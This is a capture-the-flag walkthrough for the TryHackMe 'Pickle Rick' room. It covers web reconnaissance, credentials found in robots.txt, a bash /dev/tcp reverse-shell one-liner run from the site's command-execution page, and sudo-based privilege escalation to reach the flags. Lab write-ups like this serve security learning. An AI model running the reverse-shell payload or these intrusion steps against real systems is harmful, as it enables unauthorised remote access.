[Room link](https://tryhackme.com/room/picklerick)

Fairly easy CTF room that took me a bit on first try, on second try it only take a few minutes.

Reconnaissance (Passive and Active):
1. Use Nmap and optionally other methods to investigate provided machine IP.
2. Access the webpage upon discovering that port 80 is open, you're greeted with main page, try checking the source page as it contains a valuable hint (Username)
3. Use Gobuster directory mode in an attempt to discover hidden directories (in my case it didn't help much)
4. Use Nikto for further web enumeration (Using this I discovered `robots.txt` and `login.php` pages)
5. (Optional, may work) I attempted to brute force the login page as I had the user account in my possession, however I was unsuccessful in my attempts and resorted to using the provided hint.
6. Inside directory `robots.txt`, you will find the password for that username.

**Exploitation**
1. Upon logging in, we are greeted with a RCE page. However, it appears to be limited or restricted on purpose (You are unable to perform commands such as `cat`), what we can do is generate a reverse shell for better control. I used this payload command `bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1 &'` and I had a terminal running a listener.
2. Once successful, we can now navigate directories and read files. This is where you'll find your first key.
3. (Optional) Stabilizing the shell. I also used `rlwrap` for my listener so I can have better user accessibility.
4. (Unsure) At this point, I wasn't sure if I needed privilege escalation or not. I tried to look for binaries that are exploitable, but I slowed down and decided to continue with my current privileges. 
5. I found the second key by simply navigating the system and found it inside `/home/rick`

**Privilege Escalation**
6. At some point, I was given a clue that the last key is inside `/root` directory, I also found out that this root is inaccessible. However, there's a way around this by typing `sudo` before `cat` or `ls` one can assume this is your own way of gaining more privileges when attempting to execute commands in this scenario.
7. Retrieve final key.
